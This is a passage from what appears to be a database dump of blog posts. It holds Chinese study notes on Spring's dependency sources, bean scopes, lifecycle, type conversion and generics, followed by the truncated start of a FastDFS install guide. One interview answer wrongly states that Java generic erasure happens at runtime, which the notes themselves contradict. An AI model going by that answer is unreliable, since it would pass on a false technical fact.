class=\"hljs-string\">&quot;&quot;</span>/&gt;</span>\n</code></div></pre>\n</li>\n<li>\n<p>@Bean public User user(){}</p>\n</li>\n<li>\n<p>BeanDefinitionBuilder</p>\n</li>\n</ul>\n<p>单例对象</p>\n<ul>\n<li>API实现</li>\n</ul>\n<p>非 Spring 容器管理对象(ResolvableDependency)</p>\n<p>Spring 容器管理和游离对象</p>\n<table>\n<thead>\n<tr>\n<th>来源</th>\n<th>Spring Bean 对象</th>\n<th>生命周期管理</th>\n<th>配置元信息</th>\n<th>使用场景</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Spring BeanDefinition</td>\n<td>是</td>\n<td>是</td>\n<td>有</td>\n<td>依赖查找、依赖注入</td>\n</tr>\n<tr>\n<td>单体对象</td>\n<td>是</td>\n<td>否</td>\n<td>无</td>\n<td>依赖查找、依赖注入</td>\n</tr>\n<tr>\n<td>ResolvableDependency</td>\n<td>否</td>\n<td>否</td>\n<td>无</td>\n<td>依赖注入</td>\n</tr>\n</tbody>\n</table>\n<h3><a id=\"Spring_BeanDefinition_630\"></a>Spring BeanDefinition作为依赖注入来源</h3>\n<p>要素</p>\n<ul>\n<li>元数据: BeanDefinition</li>\n<li>注册: BeanDefinitionRegistry#registerBeanDefinition</li>\n<li>类型: 延迟和非延迟</li>\n<li>顺序: Bean 生命周期顺序按照注册顺序</li>\n</ul>\n<h3><a id=\"_639\"></a>单例对象作为依赖来源</h3>\n<p>要素:</p>\n<ul>\n<li>来源: 外部普通Java对象(不一定是 POJO)</li>\n<li>注册: SingletonBeanRegistry@registerSingleton</li>\n</ul>\n<p>限制</p>\n<ul>\n<li>无生命周期管理</li>\n<li>无法实现延迟初始化 Bean</li>\n</ul>\n<h3><a id=\"_Spring__651\"></a>非 Spring 容器管理对象作为依赖来源</h3>\n<p>要素</p>\n<ul>\n<li>注册: ConfigurableListableBeanFactory#registerResolvableDependency</li>\n</ul>\n<p>限制</p>\n<ul>\n<li>无生命周期管理</li>\n<li>无法实现延迟加载</li>\n<li>无法通过依赖查找</li>\n<li>只能用于类型方法方面的注入 不能用于名称方面的注入</li>\n</ul>\n<h3><a id=\"_664\"></a>面试题</h3>\n<h4><a id=\"_666\"></a>注入和查找的依赖来源是否相同</h4>\n<p>否, 依赖查找的来源仅限于 Spring BeanDefinition 以及单例对象, 而依赖注入的来源还包括 Resolvable Dependency 以及 @Value 所标注的外部化配置</p>\n<h4><a id=\"_IOC__670\"></a>单例对象能在 IOC 容器启动后注册吗</h4>\n<p>可以的, 单例对象 与 BeanDefinition 不同, BeanDefinition 会被 ConfigurableListableBeanFactory#freezeConfiguration()方法影响，从而冻结注册, 单例对象则没有这个限制</p>\n<h4><a id=\"Spring__674\"></a>Spring 依赖注入的来源有哪些</h4>\n<ul>\n<li>Spring BeanDefinition</li>\n<li>单例对象</li>\n<li>Resolvable Dependency: ConfigurableListableBeanFactory#registerResolvableDependency</li>\n<li>@Value 外部化配置: @Autowired 和 @Value 在AutowiredAnnotationBeanPostProcessor处理</li>\n</ul>\n<h2><a id=\"Spring_Bean__681\"></a>Spring Bean 作用域</h2>\n<table>\n<thead>\n<tr>\n<th>来源</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>singleton</td>\n<td>默认 Spring Bean 作用域 一个 BeanFactory 有且仅有一个实例</td>\n</tr>\n<tr>\n<td>prototype</td>\n<td>原型作用域 每次依赖查找和依赖注入生成新的Bean对象</td>\n</tr>\n<tr>\n<td>request</td>\n<td>将 Spring Bean 储存在 ServletRequest 上下文中</td>\n</tr>\n<tr>\n<td>session</td>\n<td>将 Spring Bean 储存在 HttpSession上下文中</td>\n</tr>\n<tr>\n<td>application</td>\n<td>将 Spring Bean 储存在 ServletContext 上下文中</td>\n</tr>\n</tbody>\n</table>\n<h3><a id=\"prototype_Bean__691\"></a>prototype Bean 作用域</h3>\n<p>Spring 容器 没有办法管理 prototype Bean 的完整的生命周期, 也没有办法记录实例的存在, 销毁回调方法将不会执行, 可以利用 BeanPostProcessor 进行清扫工作</p>\n<h3><a id=\"request_Bean__695\"></a>request Bean 作用域</h3>\n<p>配置</p>\n<ul>\n<li>\n<p>XML</p>\n<pre><div class=\"hljs\"><code class=\"lang-xml\"> <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">bean</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">&quot;&quot;</span> <span class=\"hljs-attr\">scope</span>=<span class=\"hljs-string\">&quot;request&quot;</span>/&gt;</span>\n</code></div></pre>\n</li>\n<li>\n<p>Java 注解 @RequestScope 或者 @Scope(WebApplicationContext.SCOPE_REQUEST)</p>\n</li>\n</ul>\n<p>实现</p>\n<ul>\n<li>API RequestScope</li>\n</ul>\n<h3><a id=\"session_Bean_711\"></a>session Bean作用域</h3>\n<p>配置</p>\n<ul>\n<li>\n<p>XML</p>\n<pre><div class=\"hljs\"><code class=\"lang-xml\"> <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">bean</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">&quot;&quot;</span> <span class=\"hljs-attr\">scope</span>=<span class=\"hljs-string\">&quot;session&quot;</span>/&gt;</span>\n</code></div></pre>\n</li>\n<li>\n<p>Java 注解 @SessionScope 或者 @Scope(WebApplicationContext.SCOPE_SESSION)</p>\n</li>\n</ul>\n<p>实现</p>\n<ul>\n<li>API SessionScope</li>\n</ul>\n<h3><a id=\"application_Bean_727\"></a>application Bean作用域</h3>\n<p>配置</p>\n<ul>\n<li>\n<p>XML</p>\n<pre><div class=\"hljs\"><code class=\"lang-xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">bean</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">&quot;&quot;</span> <span class=\"hljs-attr\">scope</span>=<span class=\"hljs-string\">&quot;application &quot;</span>/&gt;</span>\n</code></div></pre>\n</li>\n<li>\n<p>Java 注解 @ApplicationScope 或者 @Scope(WebApplicationContext.SCOPE_APPLICATION)</p>\n</li>\n</ul>\n<p>实现</p>\n<ul>\n<li>API ServletContextScope</li>\n</ul>\n<h3><a id=\"_Bean__743\"></a>自定义 Bean 作用域</h3>\n<p>实现 Scope</p>\n<ul>\n<li>org.springframework.beans.factory.config.Scope</li>\n</ul>\n<p>注册 Scope(两种方式都行)</p>\n<ul>\n<li>\n<p>API org.springframework.beans.factory.config.ConfigurableBeanFactory#registerScope</p>\n</li>\n<li>\n<p>配置</p>\n<pre><div class=\"hljs\"><code class=\"lang-xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">bean</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">&quot;org.springframework.beans.factory.config.CustomScopeConfigurer&quot;</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">property</span> <span class=\"hljs-attr\">name</span>=<span class=\"hljs-string\">&quot;scopes&quot;</span>&gt;</span>\n        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">map</span>&gt;</span>\n            <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">entry</span> <span class=\"hljs-attr\">key</span>=<span class=\"hljs-string\">&quot;...&quot;</span> <span class=\"hljs-attr\">value-ref</span>=<span class=\"hljs-string\">&quot;...&quot;</span>&gt;</span>\n            <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">entry</span>&gt;</span>\n        <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">map</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">property</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">bean</span>&gt;</span>\n</code></div></pre>\n</li>\n</ul>\n<h3><a id=\"_766\"></a>面试题</h3>\n<h4><a id=\"Spring__Bean__768\"></a>Spring 内建的 Bean 作用域有几种</h4>\n<ul>\n<li>singleton</li>\n<li>prototype</li>\n<li>request</li>\n<li>session</li>\n<li>application</li>\n<li>websocket</li>\n</ul>\n<h4><a id=\"singleton_Bean__777\"></a>singleton Bean 在一个应用中是否是唯一的</h4>\n<p>否 singleton bean 仅在当前 Spring IOC 容器中(Bean Factory)是单例对象</p>\n<p>因为整个应用可能包含多个应用上下文, 比如 一个静态字段在JVM中是否唯一呢 答案也是否 因为一个静态字段对于加载它的ClassLoader是唯一的, 但是一个应用可以有多个ClassLoader</p>\n<h4><a id=\"application_Bean__783\"></a>application Bean 是否被其他方案替代?</h4>\n<p>可以的 实际上 application Bean 与 singleton Bean 没有本质区别</p>\n<h2><a id=\"Spring_Bean__787\"></a>Spring Bean 生命周期</h2>\n<h3><a id=\"Spring_Bean__789\"></a>Spring Bean 元信息配置阶段</h3>\n<p>面向资源</p>\n<ul>\n<li>XML 配置</li>\n<li>Properties 资源配置</li>\n</ul>\n<p>面向注解</p>\n<p>面向 API</p>\n<h3><a id=\"Spring_BeanDefinition__800\"></a>Spring BeanDefinition 合并阶段</h3>\n<p>BeanDefinition 合并</p>\n<p>AbstractBeanFactory#getMergedBeanDefinition</p>\n<ul>\n<li>父子 BeanDefinition 合并\n<ul>\n<li>当前BeanFactory 查找</li>\n<li>层次 BeanFactory 查找</li>\n</ul>\n</li>\n</ul>\n<h3><a id=\"Spring_Bean_Class__810\"></a>Spring Bean Class 加载阶段</h3>\n<ul>\n<li>ClassLoader 类加载: 使用Java 传统的ClassLoader加载</li>\n<li>Java Security 安全控制</li>\n<li>ConfigurationBeanFactory 临时 ClassLoader</li>\n</ul>\n<p>AbstractBeanFactory#doGetBean</p>\n<p>AbstractAutowireCapableBeanFactory#createBean</p>\n<p>AbstractBeanFactory#resolveBeanClass</p>\n<p>AbstractBeanFactory#doResolveBeanClass</p>\n<p>AbstractBeanDefinition#resolveBeanClass &gt;&gt; ClassUtils.forName(className, classLoader)</p>\n<h3><a id=\"Spring_Bean__826\"></a>Spring Bean 实例化前阶段</h3>\n<p>非主流生命周期 Bean 实例化前阶段</p>\n<p>InstantiationAwareBeanPostProcessor#postProcessBeforeInstantiation</p>\n<h3><a id=\"Spring_Bean__832\"></a>Spring Bean 实例化阶段</h3>\n<p>传统实例化方式</p>\n<ul>\n<li>实例化策略: InstantiationStrategy</li>\n<li>构造器依赖注入</li>\n</ul>\n<h3><a id=\"Spring_Bean__839\"></a>Spring Bean 属性赋值前阶段</h3>\n<p>Bean 属性值元信息</p>\n<ul>\n<li>PropertyValue</li>\n</ul>\n<p>Bean 属性赋值回调</p>\n<ul>\n<li>Spring 1.2 - 5.0: InstantiationAwareBeanPostProcessor#postProcessPropertyValues</li>\n<li>Spring 5.1: InstantiationAwareBeanPostProcessor#postProcessProperties</li>\n</ul>\n<h3><a id=\"Spring_Bean_Aware__850\"></a>Spring Bean Aware 接口回调阶段</h3>\n<p>Spring Aware 接口</p>\n<p>AbstractAutowireCapableBeanFactory#invokeAwareMethods</p>\n<p>普通的BeanFactory回调只有三个</p>\n<ul>\n<li>BeanNameAware</li>\n<li>BeanClassLoaderAware</li>\n<li>BeanFactoryAware</li>\n</ul>\n<p>AbstractApplicationContext#prepareBeanFactory</p>\n<p>ApplicationContextAwareProcessor#postProcessBeforeInitialization</p>\n<p>只有基于ApplicationContext才会触发以下回调(BeanFactory则不行)</p>\n<ul>\n<li>EnvironmentAware</li>\n<li>EmbeddedValueResolverAware</li>\n<li>ResourceLoaderAware</li>\n<li>ApplicationEventPublisherAware</li>\n<li>MessageSourceAware</li>\n<li>ApplicationContextAware</li>\n</ul>\n<h3><a id=\"Spring_Bean__875\"></a>Spring Bean 初始化前阶段</h3>\n<p>已完成</p>\n<ul>\n<li>Bean 实例化</li>\n<li>Bean 属性赋值</li>\n<li>Bean Aware 接口回调</li>\n</ul>\n<p>方法回调</p>\n<ul>\n<li>BeanPostProcessor#postProcessBeforeInitialization</li>\n</ul>\n<h3><a id=\"Spring_Bean__887\"></a>Spring Bean 初始化阶段</h3>\n<p>Bean 初始化 (Initialization)  &gt;&gt; AbstractAutowireCapableBeanFactory#initializeBean</p>\n<ul>\n<li>@PostConstruct 标注方法(依赖于注解驱动)</li>\n</ul>\n<p>AbstractAutowireCapableBeanFactory#invokeInitMethods</p>\n<ul>\n<li>\n<p>实现 InitializingBean 接口的 afterPropertiesSet()方法</p>\n</li>\n<li>\n<p>自定义初始化方法</p>\n</li>\n</ul>\n<h3><a id=\"Spring_Bean__899\"></a>Spring Bean 初始化后阶段</h3>\n<p>方法回调</p>\n<ul>\n<li>BeanPostProcessor#postProcessorAfterInitialization</li>\n</ul>\n<h3><a id=\"Spring_Bean__905\"></a>Spring Bean 初始化完成阶段</h3>\n<p>方法回调</p>\n<ul>\n<li>Spring 4.1+: SmartInitializationSingleton#afterSingletonsInstantiated</li>\n</ul>\n<p>作用: 确保Bean已经完完全全地完整地初始化 防止Bean达到一些不确定的状态</p>\n<h3><a id=\"Spring_Bean__913\"></a>Spring Bean 销毁前阶段</h3>\n<p>方法回调</p>\n<p>InitDestroyAnnotationBeanPostProcessor#postProcessBeforeDestruction</p>\n<ul>\n<li>DestructionAwareBeanPostProcessor#postProcessBeforeDestruction</li>\n</ul>\n<p>DisposableBeanAdapter#destroy</p>\n<h3><a id=\"Spring_Bean__923\"></a>Spring Bean 销毁阶段</h3>\n<p>见前面的<code>销毁 Spring Bean 内容</code></p>\n<p>在 ApplicationContext环境中可以通过close()方法进行 Bean的销毁</p>\n<h3><a id=\"Bean__929\"></a>Bean 垃圾回收</h3>\n<p>见前面的<code>Bean 垃圾回收</code></p>\n<h3><a id=\"_933\"></a>面试题</h3>\n<h4><a id=\"BeanPostProcessor_935\"></a>BeanPostProcessor的使用场景有哪些</h4>\n<p>BeanPostProcessor 提供SpringBean初始化前和初始化后的生命周期回调 分别对应 postProcessorBeforeInitialization 以及 postProcessAfterInitialization 方法 允许对Bean进行扩展甚至是替换; 其中 ApplicationContext 相关的 Aware 回调也是基于 BeanPostProcessor 实现, 即 ApplicationContextAwareProcessor</p>\n<h4><a id=\"BeanFactoryPostProcessor__BeanPostProcessor__939\"></a>BeanFactoryPostProcessor 与 BeanPostProcessor 的区别</h4>\n<p>BeanFactoryPostProcessor  是 Spring BeanFactory (实际上为 ConfigurableListableBeanFactory) 的后置处理器, 用于扩展 BeanFactory 或通过 BeanFactory 进行依赖查找或者依赖注入</p>\n<p>BeanFactoryPostProcessor 必须有 Spring ApplicationContext 执行, BeanFactory 无法与其直接交互</p>\n<p>而 BeanPostProcessor 则直接与 BeanFactory 关联 属于 N对1的关系</p>\n<h4><a id=\"BeanFactory__Bean__947\"></a>BeanFactory 是怎样处理 Bean 生命周期的呢</h4>\n<p>BeanFactory 的默认实现为 DefaultListableBeanFactory 其中 Bean 生命周期与方法映射如下</p>\n<ul>\n<li>BeanDefinition 注册阶段 &gt;&gt; registerBeanDefinition</li>\n<li>BeanDefinition 合并阶段 &gt;&gt; getMergedBeanDefinition</li>\n<li>Bean 实例化前阶段 &gt;&gt; resolveBeforeInstantiation</li>\n<li>Bean 实例化阶段 &gt;&gt; createBeanInstance</li>\n<li>Bean 实例化后阶段 &gt;&gt; populateBean</li>\n<li>Bean 属性赋值前阶段 &gt;&gt; populateBean</li>\n<li>Bean 属性赋值阶段 &gt;&gt; populateBean</li>\n<li>Bean Aware 接口回调阶段 &gt;&gt; initializeBean</li>\n<li>Bean 初始化前阶段 &gt;&gt; initializeBean</li>\n<li>Bean 初始化阶段 &gt;&gt; initializeBean</li>\n<li>Bean 初始化后阶段 &gt;&gt; initializeBean</li>\n<li>Bean 销毁前阶段 &gt;&gt; destroyBean</li>\n<li>Bean 销毁阶段 &gt;&gt; destroyBean</li>\n</ul>\n<h2><a id=\"Spring__965\"></a>Spring 配置元信息</h2>\n<ul>\n<li>Spring Bean 配置元信息 &gt;&gt; BeanDefinition</li>\n<li>Spring Bean 属性元信息 &gt;&gt; PropertyValues</li>\n<li>Spring 容器配置元信息</li>\n<li>Spring 外部化配置元信息 &gt;&gt; PropertySource</li>\n<li>Spring Profile 元信息 &gt;&gt; @Profile (Environment接口相关)</li>\n</ul>\n<h3><a id=\"Bean__973\"></a>Bean 配置元信息</h3>\n<ul>\n<li>GenericBeanDefinition: 通用型 BeanDefinition</li>\n<li>RootBeanDefinition: 无 Parent 的 BeanDefinition或者合并后 BeanDefinition</li>\n<li>AnnotationBeanDefinition: 注解标注的 BeanDefinition</li>\n</ul>\n<p>StandardAnnotationMetadata: 基于 Java反射</p>\n<p>SimpleAnnotationMetadataReadingVisitor: 基于 ASM</p>\n<h2><a id=\"Spring__983\"></a>Spring 类型转换</h2>\n<h3><a id=\"Spring__985\"></a>Spring 内建类型转换器</h3>\n<table>\n<thead>\n<tr>\n<th>转换场景</th>\n<th>实现类所在包名</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>日期 时间相关</td>\n<td>org.springframework.format.datetime</td>\n</tr>\n<tr>\n<td>Java 8 日期 时间相关</td>\n<td>org.springframework.format.datetime.standard</td>\n</tr>\n<tr>\n<td>通用实现</td>\n<td>org.springframework.core.convert.support</td>\n</tr>\n</tbody>\n</table>\n<h3><a id=\"Converter__993\"></a>Converter 接口的局限性</h3>\n<p>局限一: 缺少 Source Type 和 Target Type 前置判断</p>\n<ul>\n<li>应对: 增加 org.springframework.core.convert.converter.ConditionalConverter</li>\n</ul>\n<p>局限二: 仅能转换单一的 Source Type 和 Target Type</p>\n<ul>\n<li>应对: 使用 org.springframework.core.convert.converter.GenericConverter 代替</li>\n</ul>\n<h3><a id=\"GenericConverter__1003\"></a>GenericConverter 接口</h3>\n<p>org.springframework.core.convert.converter.GenericConverter</p>\n<table>\n<thead>\n<tr>\n<th>核心要素</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>使用场景</td>\n<td>用于复合类型转换场景 比如 Collection Map 数组等</td>\n</tr>\n<tr>\n<td>转换范围</td>\n<td>Set&lt;ConvertiblePair&gt; getConvertibleTypes()</td>\n</tr>\n<tr>\n<td>配对类型</td>\n<td>org.springframework.core.convert.converter.GenericConverter.ConvertiblePair</td>\n</tr>\n<tr>\n<td>转换方法</td>\n<td>convert(@Nullable Object source, TypeDescriptor sourceType, TypeDescriptor targetType)</td>\n</tr>\n<tr>\n<td>类型描述</td>\n<td>org.springframework.core.convert.TypeDescriptor</td>\n</tr>\n</tbody>\n</table>\n<h3><a id=\"_GenericConverter__1015\"></a>优化 GenericConverter 接口</h3>\n<p>GenericConverter 局限性</p>\n<ul>\n<li>缺少 Source Type 和 Target Type 前置判断</li>\n<li>单一类型转换实现复杂</li>\n</ul>\n<p>GenericConverter 优化接口 - ConditionalGenericConverter</p>\n<ul>\n<li>复合类型转换: org.springframework.core.convert.converter.GenericConverter</li>\n<li>类型条件判断: org.springframework.core.convert.converter.ConditionalConverter</li>\n</ul>\n<h3><a id=\"_Spring__1027\"></a>扩展 Spring 类型转换器</h3>\n<p>实现转换器接口</p>\n<ul>\n<li>org.springframework.core.convert.converter.Converter</li>\n<li>org.springframework.core.convert.converter.ConverterFactory</li>\n<li>org.springframework.core.convert.converter.GenericConverter</li>\n</ul>\n<p>注册转换器实现</p>\n<ul>\n<li>通过 org.springframework.context.support.ConversionServiceFactoryBean   (Spring Bean)</li>\n<li>通过 org.springframework.core.convert.ConversionService</li>\n</ul>\n<h3><a id=\"_1040\"></a>统一类型转换服务</h3>\n<p>org.springframework.core.convert.ConversionService</p>\n<table>\n<thead>\n<tr>\n<th>实现类型</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>GenericConversionService</td>\n<td>通用 ConversionService 模板实现 不内置转换器实现</td>\n</tr>\n<tr>\n<td>DefaultConversionService (extend GenericConversionService)</td>\n<td>基础 ConversionService  实现 内置常用转换器实现</td>\n</tr>\n<tr>\n<td>FormattingConversionService(extends GenericConversionService)</td>\n<td>通用 Formatter + GenericConversionService 实现 不内置转换器和 Formatter 实现</td>\n</tr>\n<tr>\n<td>DefaultFormattingConversionService(extend FormattingConversionService)</td>\n<td>DefaultConversionService + 格式化 实现(JSR-354 Money &amp; Currency; JSR-310 Date-Time)</td>\n</tr>\n</tbody>\n</table>\n<h3><a id=\"ConversionService__1051\"></a>ConversionService 作为依赖</h3>\n<p>类型转换底层接口 - org.springframework.beans.TypeConverter</p>\n<ul>\n<li>起始版本: Spring 2.0</li>\n<li>核心方法 &gt;&gt; convertIfNecessary 重载方法</li>\n<li>抽象实现 &gt;&gt; org.springframework.beans.TypeConverterSupport</li>\n<li>简单实现 &gt;&gt; org.springframework.beans.SimpleTypeConverter</li>\n</ul>\n<p>类型转换器底层抽象实现 - org.springframework.beans.TypeConverterSupport</p>\n<ul>\n<li>实现接口 -  org.springframework.beans.TypeConverter</li>\n<li>扩展实现 - org.springframework.beans.PropertyEditorRegistrySupport</li>\n<li>委派实现 - org.springframework.beans.TypeConverterDelegate</li>\n</ul>\n<p>类型转换器底层委派实现 - org.springframework.beans.TypeConverterDelegate</p>\n<ul>\n<li>\n<p>构造来源 - org.springframework.beans.AbstractNestablePropertyAccessor</p>\n<blockquote>\n<p>实现: org.springframework.beans.BeanWrapperImpl</p>\n</blockquote>\n</li>\n<li>\n<p>依赖 - java.beans.PropertyEditor</p>\n<blockquote>\n<p>默认内建实现 - org.springframework.beans.PropertyEditorRegistrySupport#registerDefaultEditors</p>\n</blockquote>\n</li>\n</ul>\n<h3><a id=\"_1076\"></a>面试题</h3>\n<h4><a id=\"Spring__1078\"></a>Spring 类型转换实现有哪些</h4>\n<ul>\n<li>基于 JavaBeans PropertyEditor 接口实现</li>\n<li>Spring 3.0+ 通用类型转换实现</li>\n</ul>\n<h4><a id=\"Spring__1083\"></a>Spring 类型转换器接口有哪些</h4>\n<ul>\n<li>类型转换接口 &gt;&gt; org.springframework.core.convert.converter.Converter</li>\n<li>通用类型转换接口 &gt;&gt; org.springframework.core.convert.converter.GenericConverter</li>\n<li>类型条件接口 &gt;&gt; org.springframework.core.convert.converter.ConditionalConverter</li>\n<li>综合类型转换接口 &gt;&gt; org.springframework.core.convert.converter.ConditionalGenericConverter</li>\n</ul>\n<h2><a id=\"Spring__1090\"></a>Spring 泛型处理</h2>\n<h3><a id=\"Java__1092\"></a>Java 泛型基础</h3>\n<p>泛型类型</p>\n<ul>\n<li>泛型类型是在类型上参数化的泛型类或者接口</li>\n</ul>\n<p>泛型使用场景</p>\n<ul>\n<li>编译时强制类型检查</li>\n<li>避免类型强转</li>\n<li>实现通用算法</li>\n</ul>\n<p>泛型类型擦写</p>\n<p>泛型被引入到 Java 语言中, 以便在编译时提供更严格的类型检查并支持泛型编程</p>\n<p>类型擦除确保不会为参数化类型创建新类, 因此泛型不会产生运行时开销</p>\n<p>为了实现泛型, 编译器将类型擦除应用于:</p>\n<ul>\n<li>将泛型类型中的所有类型参数替换为其边界;如果类型参数是无边界的, 则将其替换为 Object, 因此生成的字节码只包含普通类、接口和方法</li>\n<li>必要时插入类型转换以保持类型安全</li>\n<li>生成桥方法以保留扩展泛型类型中的多态性</li>\n</ul>\n<h3><a id=\"Java_5__1116\"></a>Java 5 类型接口</h3>\n<p>Java 5 类型接口 - java.lang.reflect.Type</p>\n<table>\n<thead>\n<tr>\n<th>派生类或接口</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>java.lang.Class</td>\n<td>Java 类 API</td>\n</tr>\n<tr>\n<td>java.lang.reflect.GenericArrayType</td>\n<td>泛型数组类型</td>\n</tr>\n<tr>\n<td>java.lang.reflect.ParameterizedType</td>\n<td>泛型参数类型</td>\n</tr>\n<tr>\n<td>java.lang.reflect.TypeVariable</td>\n<td>泛型类型变量</td>\n</tr>\n<tr>\n<td>java.lang.reflect.WildcardType</td>\n<td>泛型通配类型</td>\n</tr>\n</tbody>\n</table>\n<p>Java 泛型反射 API</p>\n<table>\n<thead>\n<tr>\n<th>类型</th>\n<th>API</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>泛型信息(Generics Info)</td>\n<td>java.lang.Class#getGenericInfo()</td>\n</tr>\n<tr>\n<td>泛型参数(Parameters)</td>\n<td>java.lang.reflect.ParameterizedType</td>\n</tr>\n<tr>\n<td>泛型父类(Super Classes)</td>\n<td>java.lang.Class#getGenericSuperclass()</td>\n</tr>\n<tr>\n<td>泛型接口(Interfaces)</td>\n<td>java.lang.Class#getGenericInterfaces()</td>\n</tr>\n<tr>\n<td>泛型声明(Generics Declaration)</td>\n<td>java.lang.reflect.GenericDeclaration</td>\n</tr>\n</tbody>\n</table>\n<h3><a id=\"Spring_1138\"></a>Spring泛型类型辅助类</h3>\n<p>核心 API - org.springframework.core.GenericTypeResolver</p>\n<ul>\n<li>\n<p>版本支持: [2.5.2)</p>\n</li>\n<li>\n<p>处理类型(Type)相关方法</p>\n<blockquote>\n<p>resolveReturnType</p>\n<p>resolveType</p>\n</blockquote>\n</li>\n<li>\n<p>处理泛型类型变量(TypeVariable) 相关方法</p>\n<blockquote>\n<p>getTypeVariableMap</p>\n</blockquote>\n</li>\n<li>\n<p>处理泛型参数类型(ParameterizedType) 相关方法</p>\n<blockquote>\n<p>resolveReturnTypeArgument</p>\n<p>resolveTypeArgument</p>\n<p>resolveTypeArguments</p>\n</blockquote>\n</li>\n</ul>\n<h3><a id=\"Spring__1162\"></a>Spring 泛型集合类型辅助类</h3>\n<p>核心 API - org.springframework.core.GenericCollectionTypeResolver</p>\n<ul>\n<li>\n<p>版本支持: [2.0, 4.3]</p>\n</li>\n<li>\n<p>替换实现: org.springframework.core.ResolvableType</p>\n</li>\n<li>\n<p>处理 Collection 相关</p>\n<blockquote>\n<p>getCollection*Type</p>\n</blockquote>\n</li>\n<li>\n<p>处理 Map 相关</p>\n<blockquote>\n<p>getMapKey*Type</p>\n<p>getMapValue*Type</p>\n</blockquote>\n</li>\n</ul>\n<h3><a id=\"Spring__1180\"></a>Spring 方法参数封装</h3>\n<p>核心 API - org.springframework.core.MethodParameter</p>\n<ul>\n<li>起始版本: [2.0, )</li>\n<li>元信息\n<ul>\n<li>关联的方法 - Method</li>\n<li>关联的构造器 - Constructor</li>\n<li>构造器或方法参数索引 - parameterIndex</li>\n<li>构造器或方法参数类型 - parameterType</li>\n<li>构造器或方法参数泛型类型 - genericParameterType</li>\n<li>构造器或方法参数参数名称 - parameterName</li>\n<li>所在的类 - containingClass</li>\n</ul>\n</li>\n</ul>\n<h3><a id=\"Spring_40___ResolvableType_1194\"></a>Spring 4.0 泛型优化实现 - ResolvableType</h3>\n<ul>\n<li>起始版本: [4.0, )</li>\n<li>扮演角色: GenericTypeResolver 和 GenericCollectionTypeResolver 替代者</li>\n<li>工厂方法: for*方法</li>\n<li>转换方法: as*方法</li>\n<li>处理方法: resolve*方法</li>\n</ul>\n<h3><a id=\"ResolvableType__1202\"></a>ResolvableType 的局限性</h3>\n<ul>\n<li>ResolvableType 无法处理泛型擦写</li>\n<li>ResolvableType 无法处理非具体化的 ParameterizedType</li>\n</ul>\n<h3><a id=\"_1207\"></a>面试题</h3>\n<h4><a id=\"Java__1209\"></a>Java 泛型擦写发生在编译时还是运行时?</h4>\n<p>运行时</p>\n<h4><a id=\"_Java_5_Type__1213\"></a>请介绍 Java 5 Type 类型的派生类或者接口</h4>\n<ul>\n<li>java.lang.Class</li>\n<li>java.lang.reflect.GenericArrayType</li>\n<li>java.lang.reflect.ParameterizedType</li>\n<li>java.lang.reflect.TypeVariable</li>\n<li>java.lang.reflect.WildcardType</li>\n</ul>\n<h4><a id=\"_ResolvableType__1221\"></a>请说明 ResolvableType 的设计优势</h4>\n<ul>\n<li>简化 Java 5 Type API 开发, 屏蔽复杂 API 的运用, 如 ParameterizedTpe</li>\n<li>不变性设计</li>\n<li>Fluent API 设计 (Builder 模式); 链式(流式)编程</li>\n</ul>\n',5,1,'http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJJbxuAfAUCAAAnD7zPwxo35.jpeg',2,0,'220226DP09K1F0SW','[TOC] Spring特性总览 核心特性 IOC容器 Spring事件 资源管理 国际化 校验 数据绑定 类型转换 Spring表达式 面向切面编程 数据存储 JDBC事务抽象 DAO支持 O/R映射 XML编列(XML的序列化和反序列化) Web技术 WebServlet技术栈 SpringMVC WebSocket SockJS WebReactive技术栈 SpringWebFlux We',0,0,0,NULL,0,21,'2022-03-04 09:56:01','2022-04-03 09:56:01','[\"220329D180W7F2RP\",\"220329D4RM2MM4PH\"]',0),('220403CSY0BRPBR4','FastDFS','<h1><a id=\"FastDFS_0\"></a>FastDFS</h1>\n<p><a href=\"https://github.com/happyfish100/fastdfs/wiki\" target=\"_blank\">安装教程</a></p>\n<table>\n<thead>\n<tr>\n<th>centos</th>\n<th>7.x</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>libfastcommon</td>\n<td>FastDFS分离出的一些公用函数包</td>\n</tr>\n<tr>\n<td>FastDFS</td>\n<td>FastDFS本体</td>\n</tr>\n<tr>\n<td>fastdfs-nginx-module</td>\n<td>FastDFS和nginx的关联模块</td>\n</tr>\n<tr>\n<td>nginx</td>\n<td>nginx1.15.4</td>\n</tr>\n</tbody>\n</table>\n<pre><div class=\"hljs\"><code class=\"lang-bash\"><span class=\"hljs-comment\"># 编译环境</span>\nyum install git gcc gcc-c++ make automake autoconf libtool pcre pcre-devel zlib zlib-devel openssl-devel wget vim -y\n</code></div></pre>\n<p>libfastcommon-1.0.42.tar.gz</p>\n<p>fastdfs-nginx-module-1.22.tar.gz</p>\n<p>fastdfs-6.04.tar.gz</p>\n<p>安装包放在/opt目录下</p>\n<p>全部解压到/usr/local/dfs目录中</p>\n<h3><a id=\"libfastcommon_26\"></a>安装libfastcommon</h3>\n<pre><div class=\"hljs\"><code class=\"lang-bash\"><span class=\"hljs-built_in\">cd</span> 